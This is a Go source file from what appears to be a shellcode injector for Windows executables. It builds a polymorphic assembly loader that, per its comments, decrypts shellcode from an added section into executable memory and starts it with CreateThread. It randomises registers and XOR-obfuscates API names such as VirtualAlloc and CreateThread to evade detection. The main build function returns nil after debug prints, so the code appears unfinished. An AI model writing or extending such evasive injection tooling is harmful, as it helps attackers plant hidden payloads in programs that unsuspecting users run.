package injector

import (
	"bytes"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"text/template"
)

// just for prevent [import _ "embed"] :)
var _ embed.FS

// The role of the shellcode loader is used to decrypt shellcode
// in the tail section to a new RWX page, then create thread at
// the decrypted shellcode.
var (
	//go:embed loader/loader_x86.asm
	defaultLoaderX86 string

	//go:embed loader/loader_x64.asm
	defaultLoaderX64 string
)

var (
	registerX86 = []string{
		"eax", "ebx", "ecx",
		"edx", "esi", "edi",
	}

	registerX64 = []string{
		"rax", "rbx", "rcx",
		"rdx", "rsi", "rdi",
		"r8", "r9", "r10", "r11",
		"r12", "r13", "r14", "r15",
	}

	regVolatile = []string{
		"rax", "rcx", "rdx",
		"r8", "r9",
	}

	regStable = []string{
		"rbx", "rsi", "rdi",
		"r10", "r11", "r12", "r13", "r14", "r15",
	}
)

var (
	separator = []byte{0x8F, 0x17, 0x97, 0x3C} // split each instruction
	gpaOffset = []byte{0x33, 0x22, 0x11, 0xFF} // GetProcAddress offset in IAT
)

type loaderCtx struct {
	// for replace registers
	Reg  map[string]string
	RegV map[string]string
	RegS map[string]string

	// store procedure status
	LackProcedure      bool
	LackCreateThread   bool
	LackVirtualAlloc   bool
	LackVirtualProtect bool
	LoadLibraryWOnly   bool

	// encrypt the data in segments using xor
	Kernel32DLL       []int64
	Kernel32DLLKey    []int64
	CreateThread      []int64
	CreateThreadKey   []int64
	VirtualAlloc      []int64
	VirtualAllocKey   []int64
	VirtualProtect    []int64
	VirtualProtectKey []int64
}

func (inj *Injector) buildLoader() ([][]byte, error) {
	var (
		src string
	)
	switch inj.arch {
	case "386":
		src = inj.getLoaderX86()
	case "amd64":
		src = inj.getLoaderX64()
	}
	// create assembly source
	tpl, err := template.New("loader").Funcs(template.FuncMap{
		"db":  toDB,
		"hex": toHex,
		"dr":  toRegDWORD,
		"is":  insertSeparator,
	}).Parse(src)
	if err != nil {
		return nil, fmt.Errorf("invalid assembly source template: %s", err)
	}
	ctx := &loaderCtx{
		Reg:  inj.buildRandomRegisterMap(),
		RegV: inj.buildVolatileRegisterMap(),
		RegS: inj.buildStableRegisterMap(),
	}
	err = inj.checkProcIsExist(ctx)
	if err != nil {
		return nil, err
	}
	inj.buildProcNames(ctx)
	// process loader template and assemble it
	buf := bytes.NewBuffer(make([]byte, 0, 512))
	err = tpl.Execute(buf, ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to build assembly source: %s", err)
	}

	fmt.Println(buf.String())

	inst, err := inj.assemble(buf.String())
	if err != nil {
		return nil, err
	}

	fmt.Println(len(inst))
	fmt.Println(inst)
	return nil, nil
}

func (inj *Injector) getLoaderX86() string {
	if inj.opts.LoaderX86 != "" {
		return inj.opts.LoaderX86
	}
	return defaultLoaderX86
}

func (inj *Injector) getLoaderX64() string {
	if inj.opts.LoaderX64 != "" {
		return inj.opts.LoaderX64
	}
	return defaultLoaderX64
}

func (inj *Injector) buildRandomRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = make([]string, len(registerX86))
		copy(reg, registerX86)
	case "amd64":
		reg = make([]string, len(registerX64))
		copy(reg, registerX64)
	}
	inj.regBox = reg
	register := make(map[string]string, 16)
	switch inj.arch {
	case "386":
		for _, reg := range registerX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range registerX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

func (inj *Injector) buildVolatileRegisterMap() map[string]string {
	reg := make([]string, len(regVolatile))
	copy(reg, regVolatile)
	inj.regBox = reg
	register := make(map[string]string, len(regVolatile))
	for _, reg := range regVolatile {
		register[reg] = inj.selectRegister()
	}
	return register
}

func (inj *Injector) buildStableRegisterMap() map[string]string {
	reg := make([]string, len(regStable))
	copy(reg, regStable)
	inj.regBox = reg
	register := make(map[string]string, len(regStable))
	for _, reg := range regStable {
		register[reg] = inj.selectRegister()
	}
	return register
}

// selectRegister is used to make sure each register will be selected once.
func (inj *Injector) selectRegister() string {
	idx := inj.rand.Intn(len(inj.regBox))
	reg := inj.regBox[idx]
	// remove selected register
	inj.regBox = append(inj.regBox[:idx], inj.regBox[idx+1:]...)
	return reg
}

func (inj *Injector) checkProcIsExist(ctx *loaderCtx) error {
	CreateThread := inj.getProcFromIAT("CreateThread")
	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
	var lackProcedure bool
	if CreateThread == nil {
		lackProcedure = true
		ctx.LackCreateThread = true
	}
	if VirtualAlloc == nil {
		lackProcedure = true
		ctx.LackVirtualAlloc = true
	}
	if VirtualProtect == nil {
		lackProcedure = true
		ctx.LackVirtualProtect = true
	}
	ctx.LackProcedure = lackProcedure
	if lackProcedure {
		LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
		LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
		GetProcAddress := inj.getProcFromIAT("GetProcAddress")
		if LoadLibraryA == nil && LoadLibraryW == nil {
			return errors.New("LoadLibrary is not exist in IAT")
		}
		if GetProcAddress == nil {
			return errors.New("GetProcAddress is not exist in IAT")
		}
		if LoadLibraryA == nil {
			ctx.LoadLibraryWOnly = true
		}
		inj.procLoadLibraryA = LoadLibraryA
		inj.procLoadLibraryW = LoadLibraryW
		inj.procGetProcAddress = GetProcAddress
	}
	inj.procCreateThread = CreateThread
	inj.procVirtualAlloc = VirtualAlloc
	inj.procVirtualProtect = VirtualProtect
	return nil
}

func (inj *Injector) getProcFromIAT(proc string) *iat {
	for _, iat := range inj.iat {
		if iat.proc == proc {
			return iat
		}
	}
	return nil
}

func (inj *Injector) buildProcNames(ctx *loaderCtx) {
	isUTF16 := ctx.LoadLibraryWOnly
	ctx.Kernel32DLL, ctx.Kernel32DLLKey = inj.buildProcName("kernel32.dll", isUTF16)
	ctx.CreateThread, ctx.CreateThreadKey = inj.buildProcName("CreateThread", isUTF16)
	ctx.VirtualAlloc, ctx.VirtualAllocKey = inj.buildProcName("VirtualAlloc", isUTF16)
	ctx.VirtualProtect, ctx.VirtualProtectKey = inj.buildProcName("VirtualProtect", isUTF16)
}

func (inj *Injector) buildProcName(name string, isUTF16 bool) ([]int64, []int64) {
	name += "\x00"
	if isUTF16 {
		name = toUTF16(name)
	}
	var (
		val []int64
		key []int64
	)
	switch inj.arch {
	case "386":
		// process alignment
		num := len(name) % 4
		if num != 0 {
			num = 4 - num
		}
		name += strings.Repeat("\x00", num)
		for i := len(name) - 4; i >= 0; i -= 4 {
			v := binary.LittleEndian.Uint32([]byte(name[i:]))
			k := inj.rand.Uint32()
			val = append(val, int64(v^k))
			key = append(key, int64(k))
		}
	case "amd64":
		// process alignment
		num := len(name) % 8
		if num != 0 {
			num = 8 - num
		}
		name += strings.Repeat("\x00", num)
		for i := len(name) - 8; i >= 0; i -= 8 {
			v := int64(binary.LittleEndian.Uint64([]byte(name[i:])))
			k := inj.rand.Int63()
			val = append(val, v^k)
			key = append(key, k)
		}
	}
	return val, key
}

func toUTF16(s string) string {
	u := strings.Builder{}
	u.Grow(len(s) * 2)
	for _, r := range s {
		u.WriteRune(r)
		u.WriteByte(0x00)
	}
	return u.String()
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		s := hex.EncodeToString([]byte{b[i]})
		builder.WriteString(strings.ToUpper(s))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v any) string {
	return fmt.Sprintf("0x%X", v)
}

// convert r8 -> r8d, rax -> eax
func toRegDWORD(reg string) string {
	_, err := strconv.Atoi(reg[1:])
	if err == nil {
		return reg + "d"
	}
	return strings.ReplaceAll(reg, "r", "e")
}

// for split each instruction
func insertSeparator() string {
	return ";" + toDB(separator) + ";"
}
